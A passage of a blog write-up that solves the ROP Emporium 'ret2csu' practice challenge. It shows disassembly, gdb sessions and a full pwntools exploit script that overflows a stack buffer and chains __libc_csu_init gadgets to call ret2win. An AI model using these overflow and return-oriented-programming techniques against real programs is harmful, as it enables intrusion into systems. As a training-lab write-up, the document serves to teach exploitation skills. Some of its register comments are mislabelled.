</span><span class="code-line">  <span class="token number">400678</span>:	0f 1f <span class="token number">84</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> 	nop    DWORD PTR <span class="token operator">[</span><span class="token register variable">rax</span><span class="token operator">+</span><span class="token register variable">rax</span><span class="token operator">*</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">0x0</span><span class="token operator">]</span>
</span><span class="code-line">  40067f:	<span class="token number">00</span> 
</span><span class="code-line">  <span class="token number">400680</span>:	4c <span class="token number">89</span> fa             	mov    <span class="token register variable">rdx</span>,<span class="token register variable">r15</span>
</span><span class="code-line">  <span class="token number">400683</span>:	4c <span class="token number">89</span> f6             	mov    <span class="token register variable">rsi</span>,<span class="token register variable">r14</span>
</span><span class="code-line">  <span class="token number">400686</span>:	<span class="token number">44</span> <span class="token number">89</span> ef             	mov    <span class="token register variable">edi</span>,<span class="token register variable">r13d</span>
</span><span class="code-line">  <span class="token number">400689</span>:	<span class="token number">41</span> ff <span class="token number">14</span> dc          	call   QWORD PTR <span class="token operator">[</span><span class="token register variable">r12</span><span class="token operator">+</span><span class="token register variable">rbx</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">]</span>
</span><span class="code-line">  <span class="token number">40068d</span>:	<span class="token number">48</span> <span class="token number">83</span> c3 <span class="token number">01</span>          	add    <span class="token register variable">rbx</span>,<span class="token number">0x1</span>
</span><span class="code-line">  <span class="token number">400691</span>:	<span class="token number">48</span> <span class="token number">39</span> dd             	cmp    <span class="token register variable">rbp</span>,<span class="token register variable">rbx</span>
</span><span class="code-line">  <span class="token number">400694</span>:	<span class="token number">75</span> ea                	jne    <span class="token number">400680</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">0x40</span><span class="token operator">&gt;</span>
</span><span class="code-line">  <span class="token number">400696</span>:	<span class="token number">48</span> <span class="token number">83</span> c4 <span class="token number">08</span>          	add    <span class="token register variable">rsp</span>,<span class="token number">0x8</span>
</span><span class="code-line">  40069a:	5b                   	pop    <span class="token register variable">rbx</span>
</span><span class="code-line">  40069b:	<span class="token number">5d</span>                   	pop    <span class="token register variable">rbp</span>
</span><span class="code-line">  40069c:	<span class="token number">41</span> 5c                	pop    <span class="token register variable">r12</span>
</span><span class="code-line">  40069e:	<span class="token number">41</span> <span class="token number">5d</span>                	pop    <span class="token register variable">r13</span>
</span><span class="code-line">  4006a0:	<span class="token number">41</span> 5e                	pop    <span class="token register variable">r14</span>
</span><span class="code-line">  4006a2:	<span class="token number">41</span> 5f                	pop    <span class="token register variable">r15</span>
</span><span class="code-line">  4006a4:	c3                   	ret    
</span><span class="code-line">  4006a5:	<span class="token number">90</span>                   	nop
</span><span class="code-line">  4006a6:	<span class="token number">66</span> 2e 0f 1f <span class="token number">84</span> <span class="token number">00</span> <span class="token number">00</span> 	<span class="token register variable">cs</span> nop WORD PTR <span class="token operator">[</span><span class="token register variable">rax</span><span class="token operator">+</span><span class="token register variable">rax</span><span class="token operator">*</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">0x0</span><span class="token operator">]</span>
</span><span class="code-line">  4006ad:	<span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> 
</span><span class="code-line">
</span><span class="code-line">00000000004006b0 <span class="token operator">&lt;</span>__libc_csu_fini<span class="token operator">&gt;</span>:
</span><span class="code-line">  4006b0:	f3 c3                	repz ret z
</span></code></pre></div><p>The <strong>__libc_csu_init</strong> section contains a sequence of pop, ret instructions which makes it a good attack vector for our rop chain. The gadgets present in this section enables us to control <strong>RBX, RBP, R12, R13, R14, and R15</strong> registers. From the ret-to-csu referenced paper this makes it a perfect candidate for our first stage and second stage rop chain.</p><p>The first stage gadget is shown in disassembled code below. This enables us to control the registers with the values we want, which makes our second stage gadget more controllable.</p><div class="relative"><pre><code class="language-nasm code-highlight"><span class="code-line">  40069a:	5b                   	pop    <span class="token register variable">rbx</span>
</span><span class="code-line">  40069b:	<span class="token number">5d</span>                   	pop    <span class="token register variable">rbp</span>
</span><span class="code-line">  40069c:	<span class="token number">41</span> 5c                	pop    <span class="token register variable">r12</span>
</span><span class="code-line">  40069e:	<span class="token number">41</span> <span class="token number">5d</span>                	pop    <span class="token register variable">r13</span> 
</span><span class="code-line">  4006a0:	<span class="token number">41</span> 5e                	pop    <span class="token register variable">r14</span>
</span><span class="code-line">  4006a2:	<span class="token number">41</span> 5f                	pop    <span class="token register variable">r15</span>
</span><span class="code-line">  4006a4:	c3                   	ret    
</span></code></pre></div><p>For the second stage, we need to look for the gadgets that will enable us to control the <strong>RDI, RSI and RDX</strong> registers in that order. This is because of x86_64 calling convention, the first three arguments to a function are passed in <strong>RDI, RSI and RDX</strong> registers respectively. From the disassembly of <strong>__libc_csu_init</strong> we can get our second gadget to build our rop chain.</p><div class="relative"><pre><code class="language-nasm code-highlight"><span class="code-line">mov    <span class="token register variable">rdx</span>,<span class="token register variable">r15</span>
</span><span class="code-line">mov    <span class="token register variable">rsi</span>,<span class="token register variable">r14</span>
</span><span class="code-line">mov    <span class="token register variable">edi</span>,<span class="token register variable">r13d</span>
</span><span class="code-line">call   QWORD PTR <span class="token operator">[</span><span class="token register variable">r12</span><span class="token operator">+</span><span class="token register variable">rbx</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">]</span>
</span></code></pre></div><p>From the above code, we are now able to control the <strong>rdx, rsi and edi</strong> registers.The call in the second stage gadgets, calculates the destination address of our code.</p><p>Because we have all the gadgets we need to build our rop chain. From the authors website, the challenge is very similar to <strong>ret2win</strong> challenge.</p><blockquote><p>This challenge is very similar to &quot;callme&quot;, with the exception of the useful gadgets. Simply call the ret2win() function in the accompanying library with same arguments that you used to beat the &quot;callme&quot; challenge (ret2win(0xdeadbeef, 0xcafebabe, 0xd00df00d) for the ARM &amp; MIPS binaries, ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) for the x86_64 binary.</p></blockquote><p>From the description, we want to pass three arguments to ret2win function. The arguments will be passed to rdi, rsi and rdx respectively. Because we don`t control the these registers directly, we need to set these arguments in the first rop chain that will enable us to control the rdi, rsi and rdx in the second gadget.</p><div class="relative"><pre><code class="language-nasm code-highlight"><span class="code-line"><span class="token register variable">rdi</span> <span class="token operator">&lt;</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token register variable">r13</span> <span class="token operator">&lt;</span><span class="token operator">-</span><span class="token operator">-</span>  #first args   <span class="token number">0xdeadbeefdeadbeef</span>
</span><span class="code-line"><span class="token register variable">rsi</span> <span class="token operator">&lt;</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token register variable">r14</span> <span class="token operator">&lt;</span><span class="token operator">-</span><span class="token operator">-</span>  #second args  <span class="token number">0xcafebabecafebabe</span>
</span><span class="code-line"><span class="token register variable">rdx</span> <span class="token operator">&lt;</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token register variable">r15</span> <span class="token operator">&lt;</span><span class="token operator">-</span><span class="token operator">-</span>  #third args   <span class="token number">0xd00df00dd00df00d</span>
</span></code></pre></div><p>From the code snip above, we are now able to control the values of ropchain by setting the registers values as shown in the code above. For debugging our exploit we will use python3 and gdb. Debugging our exploit ensures that there is no unexpected behavior in the code to avoid crashing of the program.</p><p>For debugging purposes, we set a breakpoint in our first address of the ropchain gadget, and run our program with the generated payload.</p><div class="relative"><pre><code class="language-nasm code-highlight"><span class="code-line">(gdb) break <span class="token operator">*</span><span class="token number">0x000000000040069a</span>
</span><span class="code-line">Breakpoint <span class="token number">1</span> at <span class="token number">0x40069a</span>
</span><span class="code-line">(gdb) r <span class="token operator">&lt;</span><span class="token operator">/</span>tmp<span class="token operator">/</span>payload
</span><span class="code-line">Starting program: <span class="token operator">/</span>home<span class="token operator">/</span>vx<span class="token operator">/</span>Downloads<span class="token operator">/</span>rop<span class="token operator">/</span>rop<span class="token operator">/</span>ret2csu<span class="token operator">/</span>ret2csu <span class="token operator">&lt;</span><span class="token operator">/</span>tmp<span class="token operator">/</span>payload
</span><span class="code-line">
</span><span class="code-line">Breakpoint <span class="token number">1</span>, <span class="token number">0x000000000040069a</span> in __libc_csu_init ()
</span><span class="code-line">(gdb) c
</span><span class="code-line">Continuing.
</span><span class="code-line">ret2csu by ROP Emporium
</span><span class="code-line">x86_64
</span><span class="code-line">
</span><span class="code-line">Check out https:<span class="token operator">/</span><span class="token operator">/</span>ropemporium.com<span class="token operator">/</span>challenge<span class="token operator">/</span>ret2csu.html for information on how to solve this challenge.
</span><span class="code-line">
</span><span class="code-line"><span class="token operator">&gt;</span> Thank you<span class="token operator">!</span>
</span><span class="code-line">
</span><span class="code-line">Breakpoint <span class="token number">1</span>, <span class="token number">0x000000000040069a</span> in __libc_csu_init ()
</span><span class="code-line">(gdb) 
</span></code></pre></div><p>When the program is run,its hits the breakpoint. We enter <strong>c</strong> command for continue, to continue the execution of our program. When the program finishes the execution, the return address now points back to the address of our first gadget, Because of the breakpoint, the execution stops. Now we can inspect the memory addresses in order to understand the behavior of the program and the values loaded in the registers loaded in our first chain.</p><div class="relative"><pre><code class="language-nasm code-highlight"><span class="code-line">(gdb) x<span class="token operator">/</span>10i <span class="token operator">$</span>rip
</span><span class="code-line"><span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">0x40069a</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">90</span><span class="token operator">&gt;</span>:	pop    <span class="token register variable">rbx</span>
</span><span class="code-line">   <span class="token number">0x40069b</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">91</span><span class="token operator">&gt;</span>:	pop    <span class="token register variable">rbp</span>
</span><span class="code-line">   <span class="token number">0x40069c</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">92</span><span class="token operator">&gt;</span>:	pop    <span class="token register variable">r12</span>
</span><span class="code-line">   <span class="token number">0x40069e</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">94</span><span class="token operator">&gt;</span>:	pop    <span class="token register variable">r13</span>
</span><span class="code-line">   <span class="token number">0x4006a0</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">96</span><span class="token operator">&gt;</span>:	pop    <span class="token register variable">r14</span>
</span><span class="code-line">   <span class="token number">0x4006a2</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">98</span><span class="token operator">&gt;</span>:	pop    <span class="token register variable">r15</span>
</span><span class="code-line">   <span class="token number">0x4006a4</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">100</span><span class="token operator">&gt;</span>:	ret    
</span><span class="code-line">   <span class="token number">0x4006a5</span>:	nop
</span><span class="code-line">   <span class="token number">0x4006a6</span>:	nop    WORD PTR <span class="token register variable">cs</span>:<span class="token operator">[</span><span class="token register variable">rax</span><span class="token operator">+</span><span class="token register variable">rax</span><span class="token operator">*</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">0x0</span><span class="token operator">]</span>
</span><span class="code-line">   <span class="token number">0x4006b0</span> <span class="token operator">&lt;</span>__libc_csu_fini<span class="token operator">&gt;</span>:	repz ret 
</span></code></pre></div><p>Now we can Single step through our assembly code and view the value stored in the register values of our gadget. The command for single stepping in gdb is <strong>si</strong>.</p><div class="relative"><pre><code class="language-nasm code-highlight"><span class="code-line">(gdb) i r <span class="token register variable">rbx</span> <span class="token register variable">rbp</span> <span class="token register variable">r12</span> <span class="token register variable">r13</span> <span class="token register variable">r14</span> <span class="token register variable">r15</span>
</span><span class="code-line"><span class="token register variable">rbx</span>            <span class="token number">0x4343434343434343</span>  <span class="token number">4846791580151137091</span>
</span><span class="code-line"><span class="token register variable">rbp</span>            <span class="token number">0x4242424242424242</span>  <span class="token number">0x4242424242424242</span>
</span><span class="code-line"><span class="token register variable">r12</span>            <span class="token number">0x4141414141414141</span>  <span class="token number">4702111234474983745</span>
</span><span class="code-line"><span class="token register variable">r13</span>            <span class="token number">0xdeadbeefdeadbeef</span>  <span class="token operator">-</span><span class="token number">2401053088876216593</span>
</span><span class="code-line"><span class="token register variable">r14</span>            <span class="token number">0xcafebabecafebabe</span>  <span class="token operator">-</span><span class="token number">3819410105351357762</span>
</span><span class="code-line"><span class="token register variable">r15</span>            <span class="token number">0xd00df00dd00df00d</span>  <span class="token operator">-</span><span class="token number">3454841397007486963</span>
</span><span class="code-line">(gdb) 
</span></code></pre></div><p>From the analysis, we are able to control all the register value in our chain using our generated payload file. The code for generating the payload is shown below.</p><div class="relative"><pre><code class="language-nasm code-highlight"><span class="code-line">import pwn
</span><span class="code-line">
</span><span class="code-line">pop_gadget <span class="token operator">=</span> pwn.p64(<span class="token number">0x0040069a</span>)
</span><span class="code-line">payload <span class="token operator">=</span>b<span class="token string">&quot;A&quot;</span><span class="token operator">*</span><span class="token number">32</span> #fill the buffer
</span><span class="code-line">payload <span class="token operator">+</span><span class="token operator">=</span>b<span class="token string">&quot;B&quot;</span><span class="token operator">*</span><span class="token number">8</span> #<span class="token register variable">rbp</span>(saved)
</span><span class="code-line">payload <span class="token operator">+</span><span class="token operator">=</span> pop_gadget  #retaddr
</span><span class="code-line">payload <span class="token operator">+</span><span class="token operator">=</span> pwn.p64(<span class="token number">0x4343434343434343</span>)#<span class="token register variable">rbx</span>
</span><span class="code-line">payload <span class="token operator">+</span><span class="token operator">=</span> pwn.p64(<span class="token number">0x4242424242424242</span>)#<span class="token register variable">rbp</span>
</span><span class="code-line">payload <span class="token operator">+</span><span class="token operator">=</span> pwn.p64(<span class="token number">0x4141414141414141</span>) #<span class="token register variable">r12</span>
</span><span class="code-line">payload <span class="token operator">+</span><span class="token operator">=</span> pwn.p64(<span class="token number">0xdeadbeefdeadbeef</span>) #<span class="token register variable">r13</span>
</span><span class="code-line">payload <span class="token operator">+</span><span class="token operator">=</span> pwn.p64(<span class="token number">0xcafebabecafebabe</span>) #<span class="token register variable">r14</span>
</span><span class="code-line">payload <span class="token operator">+</span><span class="token operator">=</span> pwn.p64(<span class="token number">0xd00df00dd00df00d</span>) #<span class="token register variable">r15</span>
</span><span class="code-line">
</span><span class="code-line">open(<span class="token string">&#x27;payload&#x27;</span>, <span class="token string">&#x27;wb&#x27;</span>).write(payload)
</span></code></pre></div><p>Now, because we are able to control the registers we want, we need to determine the correct or desired values for <strong>rbx, rbp and r12</strong> registers because 0x41..., 0x42...., 0x43... are not valid memory addresses. Because after execution of our second rop gadget, we need to set right values of rbp and rbx due to a loop conditional.</p><div class="relative"><pre><code class="language-nasm code-highlight"><span class="code-line">   <span class="token number">0x0000000000400680</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">64</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rdx</span>,<span class="token register variable">r15</span>
</span><span class="code-line">   <span class="token number">0x0000000000400683</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">67</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rsi</span>,<span class="token register variable">r14</span>
</span><span class="code-line">   <span class="token number">0x0000000000400686</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">70</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">edi</span>,<span class="token register variable">r13d</span>
</span><span class="code-line">   <span class="token number">0x0000000000400689</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">73</span><span class="token operator">&gt;</span>:	call   QWORD PTR <span class="token operator">[</span><span class="token register variable">r12</span><span class="token operator">+</span><span class="token register variable">rbx</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">]</span>
</span><span class="code-line">   <span class="token number">0x000000000040068d</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">77</span><span class="token operator">&gt;</span>:	add    <span class="token register variable">rbx</span>,<span class="token number">0x1</span>
</span><span class="code-line">   <span class="token number">0x0000000000400691</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">81</span><span class="token operator">&gt;</span>:	cmp    <span class="token register variable">rbp</span>,<span class="token register variable">rbx</span>
</span><span class="code-line">   <span class="token number">0x0000000000400694</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">84</span><span class="token operator">&gt;</span>:	jne    <span class="token number">0x400680</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">64</span><span class="token operator">&gt;</span>
</span><span class="code-line">   <span class="token number">0x0000000000400696</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">86</span><span class="token operator">&gt;</span>:	add    <span class="token register variable">rsp</span>,<span class="token number">0x8</span>
</span></code></pre></div><p>The address of second gadget starts at <strong>0x0000000000400680</strong>,in which we are setting the values of rdi,r14 and rdx with correct argument values. we need to set the values of <strong>rbx</strong> and <strong>rbp</strong> correctly so that conditional <strong>cmp</strong> is always true. Because of add instruction of 1 to rbx, we need to set the rbx value to 0 and rbp value to 1. when the comparison is being done, the values are equal and Zero flag is set. Adjust values in payload script and single step to confirm the validity of new values in the memory.</p><p>For register <strong>r12</strong>, we set the value to a memory region that is executable. In the binary, the <strong>.bss</strong> section is executable. we now set the r12 register with the memory address of bss section. After executing our second rop chain gadget, we need to adjust the stack as shown in the exploit code to avoid segmentation fault.</p><p>Lastly we need to control the <strong>rdi</strong> register with the value <strong>0xdeadbeefdeadbeef</strong>. Because we have full control of rdx and rsi register, we need to look for <strong>pop rdi, ret</strong> gadget.</p><p>The pop rdi, ret gadget</p><div class="relative"><pre><code class="language-nasm code-highlight"><span class="code-line">  <span class="token number">0x004006a3</span>                 5f  pop <span class="token register variable">rdi</span>
</span><span class="code-line">  <span class="token number">0x004006a4</span>                 c3  ret
</span></code></pre></div><p>Now we can pass the <strong>0xdeadbeefdeadbeef</strong> argument to the ret2win function.Now we have all the correct values of rdi, rsi and rdx correctly set, calling the ret2win function will result to us getting the correct flag.</p><h2 id="exploit"><a href="#exploit" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Exploit</h2><p>The full code of the rop is as shown below.</p><div class="relative"><pre><code class="code-highlight language-python"><span class="code-line"><span class="token keyword">import</span> pwn
</span><span class="code-line">
</span><span class="code-line">pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">&quot;latin-1&quot;</span> 
</span><span class="code-line">pwn<span class="token punctuation">.</span>warnings<span class="token punctuation">.</span>simplefilter<span class="token punctuation">(</span><span class="token string">&quot;ignore&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">&quot;amd64&quot;</span>
</span><span class="code-line">io <span class="token operator">=</span> pwn<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">&#x27;./ret2csu&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment">#arguments passed to ret2win function ret2win(arg1, arg2, arg3)</span>
</span><span class="code-line">arg1 <span class="token operator">=</span>pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeefdeadbeef</span><span class="token punctuation">)</span>
</span><span class="code-line">arg2 <span class="token operator">=</span>pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0xcafebabecafebabe</span><span class="token punctuation">)</span>
</span><span class="code-line">arg3 <span class="token operator">=</span>pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0xd00df00dd00df00d</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">ret2win_addr <span class="token operator">=</span>pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">&#x27;ret2win&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment">#resolve address of ret2win function</span>
</span><span class="code-line">pop_rbx_rbp_r12_r13_r14_r15_addr <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x0040069a</span><span class="token punctuation">)</span>  <span class="token comment">#first stage gadget</span>
</span><span class="code-line">dereference_pointer <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x00600e48</span><span class="token punctuation">)</span>  <span class="token comment">#bss area which is executable</span>
</span><span class="code-line">stage2_addr <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x00400680</span><span class="token punctuation">)</span>  <span class="token comment">#addr of second stage rop chain</span>
</span><span class="code-line">pop_rdi <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x004006a3</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># ropchains</span>
</span><span class="code-line"><span class="token comment">#stage1 ropchain</span>
</span><span class="code-line"><span class="token string triple-quoted-string">&#x27;&#x27;&#x27;
</span></span><span class="code-line"><span class="token string triple-quoted-string">            0x0040069a      pop   rbx
</span></span><span class="code-line"><span class="token string triple-quoted-string">│           0x0040069b      pop   rbp
</span></span><span class="code-line"><span class="token string triple-quoted-string">│           0x0040069c      pop   r12
</span></span><span class="code-line"><span class="token string triple-quoted-string">│           0x0040069e      pop   r13
</span></span><span class="code-line"><span class="token string triple-quoted-string">│           0x004006a0      pop   r14
</span></span><span class="code-line"><span class="token string triple-quoted-string">│           0x004006a2      pop   r15
</span></span><span class="code-line"><span class="token string triple-quoted-string">└           0x004006a4      ret
</span></span><span class="code-line"><span class="token string triple-quoted-string">&#x27;&#x27;&#x27;</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment">#Determine the loop values for conditional branch</span>
</span><span class="code-line"><span class="token string triple-quoted-string">&#x27;&#x27;&#x27;
</span></span><span class="code-line"><span class="token string triple-quoted-string">╎│          0x00400689      call  qword [r12 + rbx*8]
</span></span><span class="code-line"><span class="token string triple-quoted-string">│      ╎│   0x0040068d      add   rbx, 1
</span></span><span class="code-line"><span class="token string triple-quoted-string">│      ╎│   0x00400691      cmp   rbp, rbx
</span></span><span class="code-line"><span class="token string triple-quoted-string">│      └──&lt; 0x00400694      jne   0x400680
</span></span><span class="code-line"><span class="token string triple-quoted-string">&#x27;&#x27;&#x27;</span>
</span><span class="code-line">
</span><span class="code-line">
</span><span class="code-line">stage1 <span class="token operator">=</span> pop_rbx_rbp_r12_r13_r14_r15_addr
</span><span class="code-line">stage1 <span class="token operator">+=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>   <span class="token comment">#set RBP=0</span>
</span><span class="code-line">stage1 <span class="token operator">+=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>   <span class="token comment">#set RBX=1</span>
</span><span class="code-line">stage1 <span class="token operator">+=</span> dereference_pointer <span class="token comment">#set R12</span>
</span><span class="code-line">stage1 <span class="token operator">+=</span> arg1   <span class="token comment">#R13</span>
</span><span class="code-line">stage1 <span class="token operator">+=</span> arg2   <span class="token comment">#R14</span>
</span><span class="code-line">stage1 <span class="token operator">+=</span> arg3   <span class="token comment">#R15</span>
</span><span class="code-line">stage1 <span class="token operator">+=</span> stage2_addr
</span><span class="code-line">stage1 <span class="token operator">+=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span>   <span class="token comment">#adjust the stack</span>
</span><span class="code-line">
</span><span class="code-line">
</span><span class="code-line">
</span><span class="code-line"><span class="token comment">#stage2</span>
</span><span class="code-line"><span class="token string triple-quoted-string">&#x27;&#x27;&#x27;
</span></span><span class="code-line"><span class="token string triple-quoted-string">   ┌──&gt;     0x00400680      mov   rdx, r15
</span></span><span class="code-line"><span class="token string triple-quoted-string">│      ╎│   0x00400683      mov   rsi, r14
</span></span><span class="code-line"><span class="token string triple-quoted-string">│      ╎│   0x00400686      mov   edi, r13d
</span></span><span class="code-line"><span class="token string triple-quoted-string">│      ╎│   0x00400689      call  qword [r12 + rbx*8]
</span></span><span class="code-line"><span class="token string triple-quoted-string">&#x27;&#x27;&#x27;</span>
</span><span class="code-line">
</span><span class="code-line">stage2 <span class="token operator">=</span> pop_rdi
</span><span class="code-line">stage2 <span class="token operator">+=</span>arg1
</span><span class="code-line">stage2 <span class="token operator">+=</span>ret2win_addr 
</span><span class="code-line">
</span><span class="code-line">
</span><span class="code-line">payload <span class="token operator">=</span> <span class="token string">b&quot;A&quot;</span><span class="token operator">*</span><span class="token number">32</span>
</span><span class="code-line">payload <span class="token operator">+=</span> <span class="token string">b&quot;B&quot;</span><span class="token operator">*</span><span class="token number">8</span>
</span><span class="code-line">payload <span class="token operator">+=</span> <span class="token string">b&quot;&quot;</span> <span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>
</span><span class="code-line">    stage1<span class="token punctuation">,</span>
</span><span class="code-line">    stage2
</span><span class="code-line">    <span class="token punctuation">]</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">io<span class="token punctuation">.</span>writeafter<span class="token punctuation">(</span><span class="token string">&#x27;&gt;&#x27;</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
</span><span class="code-line">pwn<span class="token punctuation">.</span>info<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span></code></pre></div><p>Running the exploit code above we get the correct flag</p><div class="relative"><pre><code class="code-highlight language-bash"><span class="code-line">vx@archie:ret2csu$ python3 xpl.py 
</span><span class="code-line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">&#x27;./ret2csu&#x27;</span><span class="token builtin class-name">:</span> pid <span class="token number">18869</span>
</span><span class="code-line">    Arch:     amd64-64-little
</span><span class="code-line">    RELRO:    Partial RELRO
</span><span class="code-line">    Stack:    No canary found
</span><span class="code-line">    NX:       NX enabled
</span><span class="code-line">    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
</span><span class="code-line">    RUNPATH:  b<span class="token string">&#x27;.&#x27;</span>
</span><span class="code-line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Receiving all data: Done <span class="token punctuation">(</span>45B<span class="token punctuation">)</span>
</span><span class="code-line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">&#x27;./ret2csu&#x27;</span> stopped with <span class="token builtin class-name">exit</span> code <span class="token number">0</span> <span class="token punctuation">(</span>pid <span class="token number">18869</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>  Thank you<span class="token operator">!</span>
</span><span class="code-line">    ROPE<span class="token punctuation">{</span>a_placeholder_32byte_flag<span class="token operator">!</span><span class="token punctuation">}</span>
</span></code></pre></div><h2 id="references"><a href="#references" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>References</h2><ol><li><a target="_blank" rel="noopener noreferrer" href="https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf">Universal ROP or Return-to-csu</a></li><li><a target="_blank" rel="noopener noreferrer" href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">Linux program startup</a></li></ol></div><div id="comment"></div></div><footer><div class="divide-gray-200 text-sm font-medium leading-5 dark:divide-gray-700 xl:col-start-1 xl:row-start-2 xl:divide-y"><div class="py-4 xl:py-8"><h2 class="text-xs uppercase tracking-wide text-gray-500 dark:text-gray-400">Tags</h2><div class="flex flex-wrap"><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/ropemporium">ropemporium</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/rop">rop</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/pwn">pwn</a></div></div><div class="flex justify-between py-4 xl:block xl:space-y-8 xl:py-8"><div><h2 class="text-xs uppercase tracking-wide text-gray-500 dark:text-gray-400">Previous Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/ropemporium-ret2win">Return-Oriented Programming - ret2win</a></div></div><div><h2 class="text-xs uppercase tracking-wide text-gray-500 dark:text-gray-400">Next Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/ropemporium-callme">Return-Oriented Programming - Callme</a></div></div></div></div><div class="sticky top-0 pt-4 xl:pt-8"><a class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/blog">← Back to the Blog</a><div class="hidden md:block"><div class="mt-5 space-y-1 text-sm"><p class="text-lg font-bold">Table of content</p></div></div></div></footer></div></div></article></div></main><footer><div class="mt-16 flex flex-col items-center"><div class="mb-3 flex space-x-4"><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="mailto:thuri783@gmail.com"><span class="sr-only">mail</span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" class="fill-current text-gray-700 hover:text-blue-500 dark:text-gray-200 dark:hover:text-blue-400 h-6 w-6"><path d="M2.003 5.884 10 9.882l7.997-3.998A2 2 0 0 0 16 4H4a2 2 0 0 0-1.997 1.884z"></path><path d="m18 8.118-8 4-8-4V14a2 2 0 0 0 2 2h12a2 2 0 